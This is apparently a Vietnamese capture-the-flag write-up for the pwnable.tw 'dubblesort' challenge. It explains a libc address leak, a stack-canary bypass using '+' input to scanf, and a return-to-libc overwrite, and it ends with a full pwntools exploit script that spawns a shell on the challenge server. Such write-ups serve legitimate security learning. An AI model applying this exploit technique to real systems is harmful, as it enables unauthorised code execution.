# Challenge: DubbleSort

## Vấn đề
- [File challenge](https://pwnable.tw/challenge/#4)
- Chương trình thực thi như sau:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  unsigned int *v4; // edi
  unsigned int i; // esi
  unsigned int j; // esi
  int result; // eax
  unsigned int v8; // [esp+18h] [ebp-74h] BYREF
  unsigned int v9[8]; // [esp+1Ch] [ebp-70h] BYREF
  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF
  unsigned int v11; // [esp+7Ch] [ebp-10h]

  v11 = __readgsdword(0x14u);
  sub_8B5();
  __printf_chk(1, "What your name :");
  read(0, buf, 64u);
  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &v8);
  v3 = v8;
  if ( v8 )
  {
    v4 = v9;
    for ( i = 0; i < v8; ++i )
    {
      __printf_chk(1, "Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", v4);
      v3 = v8;
      ++v4;
    }
  }
  sub_931(v9, v3);
  puts("Result :");
  if ( v8 )
  {
    for ( j = 0; j < v8; ++j )
      __printf_chk(1, "%u ");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v11 )
    sub_BA0();
  return result;
}
```
- Checksec:
```
+ Arch:       i386-32-little
+ RELRO:      Full RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        PIE enabled
+ RUNPATH:    b'.'
+ FORTIFY:    Enabled
```

## Giải pháp
- Ở ngay lệnh _read(0, buf, 64u);_ đầu tiên nhìn vào có thể nhận ra đây có thể khai thác Buffer Overflow vì bytes đọc nó khá nhiều và ở lệnh printf tiếp theo nó sẽ in ra cả đoạn nối kế tiếp miễn không phải là NULL byte ___printf_chk(1, "Hello %s,How many numbers do you what to sort :");_
> Tận dụng nó để leak libc và lấy libc base.
```
└─$ ./dubblesort_patched
What your name :
Hello
������/,How many numbers do you what to sort :
```
- Khi đã có libc base thì giờ ta làm sao overwrite ret addr thành oneshot hoặc hàm system trong libc là lấy được shell.

## Quá trình
- Khi debug, xem trong buf tôi thấy rằng chỉ cần overwrite 29 bytes là sẽ có thể leak được libc ngay sau đó. Từ đó sẽ tính được libc base.
```
pwndbg> x/50xw 0xffffcd2c
0xffffcd2c:     0x2a9ad0d7      0xffffcfaa      0x0000002f      0x0000007c
0xffffcd3c:     0x2a95782f      0x00000001      0x00008000      0x2aa78000
0xffffcd4c:     0x56555601      0x565557a9      0x56556fa0      0x00000001
0xffffcd5c:     0x56555b72      0x00000001      0xffffce24      0xffffce2c
0xffffcd6c:     0xf241f900      0x2aa783dc      0xffffcf9b      0x56555b2b
0xffffcd7c:     0x00000000      0x2aa78000      0x2aa78000      0x00000000
0xffffcd8c:     0x2a8e0637      0x00000001      0xffffce24      0xffffce2c
0xffffcd9c:     0x00000000      0x00000000      0x00000000      0x2aa78000
0xffffcdac:     0x2aaaac04      0x00000001      0x00000000      0x2aa78000
0xffffcdbc:     0x2aa78000      0x00000000      0x0f5e4adc      0xecce8576
0xffffcdcc:     0x00000000      0x00000000      0x00000000      0xffffce20
0xffffcddc:     0x2aa86000      0x2aa862e4      0x00000001      0x00000000
0xffffcdec:     0x56556fa0      0x00000001
```
- Khi có libc base nhưng Canary của chall này bật nên cần tìm nó trước để né. Thì so sánh trong buf với stack thì tôi thấy rằng canary là địa chỉ **0x60821c00** tức ở offet 24 tính từ đầu buf. Và từ offset 24 trở đi tới offset 35 là các hàm thực thi của chương trình do đó tôi không cần biết nó chạy những gì chỉ cần overwrite tất cả thành system chạy tới lệnh nào thì lệnh đó chạy system kiểu gì cững lấy được shell.
```
pwndbg> x/50xw 0xffffccf8
0xffffccf8:     0xffffcd2c      0x2aaaac08      0x2aaa9d00      0xffffce2c
0xffffcd08:     0x00000023      0x2a9e448a      0x2aaaadd8      0xffffcd60
0xffffcd18:     0x00000000      0x00000000      0x00000000      0xffffcfaa
0xffffcd28:     0x2aa78000      0x41414141      0x41414141      0x41414141
0xffffcd38:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcd48:     0x2aa78041      0x56555601      0x565557a9      0x56556fa0
0xffffcd58:     0x00000001      0x56555b72      0x00000001      0xffffce24
0xffffcd68:     0xffffce2c      0x60821c00      0x2aa783dc      0xffffcf9b
0xffffcd78:     0x56555b2b      0x00000000      0x2aa78000      0x2aa78000
0xffffcd88:     0x00000000      0x2a8e0637      0x00000001      0xffffce24
0xffffcd98:     0xffffce2c      0x00000000      0x00000000      0x00000000
0xffffcda8:     0x2aa78000      0x2aaaac04      0x00000001      0x00000000
0xffffcdb8:     0x2aa78000      0x2aa78000
pwndbg> tel
00:0000│ esp 0xffffccf0 —▸ 0x56555bfa ◂— and eax, 0x6e450075 /* '%u' */
01:0004│-094 0xffffccf4 —▸ 0xffffcd08 ◂— 0x23 /* '#' */
02:0008│-090 0xffffccf8 —▸ 0xffffcd2c ◂— 0x41414141 ('AAAA')
03:000c│-08c 0xffffccfc —▸ 0x2aaaac08 —▸ 0x2aa84000 ◂— jg 0x2aa84047
04:0010│-088 0xffffcd00 —▸ 0x2aaa9d00 (_rtld_global_ro) ◂— 0
05:0014│-084 0xffffcd04 —▸ 0xffffce2c —▸ 0xffffcfe6 ◂— 'SHELL=/bin/bash'
06:0018│-080 0xffffcd08 ◂— 0x23 /* '#' */
07:001c│ edi 0xffffcd0c —▸ 0x2a9e448a ◂— mov edx, dword ptr [esp + 0x18]
pwndbg>
08:0020│-078 0xffffcd10 —▸ 0x2aaaadd8 —▸ 0x2aaaad64 —▸ 0x2aaaac1c —▸ 0x2aaaac08 —▸ ...
09:0024│-074 0xffffcd14 —▸ 0xffffcd60 ◂— 1
0a:0028│-070 0xffffcd18 ◂— 0
... ↓        2 skipped
0d:0034│-064 0xffffcd24 —▸ 0xffffcfaa ◂— '/home/haiwh/CTF/pwnable/doublesort_chall/dubblesort_patched'
0e:0038│-060 0xffffcd28 —▸ 0x2aa78000 ◂— 0x1afdb0
0f:003c│ esi 0xffffcd2c ◂— 0x41414141 ('AAAA')
pwndbg>
10:0040│-058 0xffffcd30 ◂— 0x41414141 ('AAAA')
... ↓     5 skipped
16:0058│-040 0xffffcd48 —▸ 0x2aa78041 ◂— 0x7f000000
17:005c│-03c 0xffffcd4c —▸ 0x56555601 ◂— add ebx, 0x199f
pwndbg>
18:0060│-038 0xffffcd50 —▸ 0x565557a9 ◂— add ebx, 0x17f7
19:0064│-034 0xffffcd54 —▸ 0x56556fa0 ◂— 0x1ea8
1a:0068│-030 0xffffcd58 ◂— 1
1b:006c│-02c 0xffffcd5c —▸ 0x56555b72 ◂— add edi, 1
1c:0070│-028 0xffffcd60 ◂— 1
1d:0074│-024 0xffffcd64 —▸ 0xffffce24 —▸ 0xffffcfaa ◂— '/home/haiwh/CTF/pwnable/doublesort_chall/dubblesort_patched'
1e:0078│-020 0xffffcd68 —▸ 0xffffce2c —▸ 0xffffcfe6 ◂— 'SHELL=/bin/bash'
1f:007c│-01c 0xffffcd6c ◂— 0x60821c00
pwndbg>
20:0080│-018 0xffffcd70 —▸ 0x2aa783dc —▸ 0x2aa791e0 ◂— 0
21:0084│-014 0xffffcd74 —▸ 0xffffcf9b ◂— 'i686'
22:0088│-010 0xffffcd78 —▸ 0x56555b2b ◂— add ebx, 0x1475
23:008c│-00c 0xffffcd7c ◂— 0
24:0090│-008 0xffffcd80 —▸ 0x2aa78000 ◂— 0x1afdb0
25:0094│-004 0xffffcd84 —▸ 0x2aa78000 ◂— 0x1afdb0
26:0098│ ebp 0xffffcd88 ◂— 0
27:009c│+004 0xffffcd8c —▸ 0x2a8e0637 (__libc_start_main+247) ◂— add esp, 0x10
```
> Ở offset cuối thêm địa chỉ "/bin/sh" trong libc để lệnh system chạy system("/bin/sh") và thế là ta có shell.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('dubblesort_patched', checksec=False)
libc = ELF('libc_32.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        ''')
        input()


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10101)
else:
    p = process([exe.path])

GDB()
##########################
### STAGE 1: Leak libc ###
##########################
sa(b'name :', b'A'*(8*3+5))
p.recvuntil(b'A'*(8*3+5))
libc_leak = u32(p.recv(3).ljust(4, b'\x00')) << 8
libc.address = libc_leak - 0x1b0000
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

##########################
### STAGE 2: Get shell ###
##########################
oneshot = [0x3a819, 0x11da9c, 0x11da9d]
sla(b'sort :', b'35')
for i in range(34):
    if i == 24:
        sla(b'number : ', b'+')
    elif i < 24: sla(b'number : ', b'1')
    else: sla(b'number : ', str(libc.sym['system']))

# GDB()
sla(b'number : ', str(next(libc.search(b'/bin/sh\x00'))))
sleep(2)
p.interactive()
```
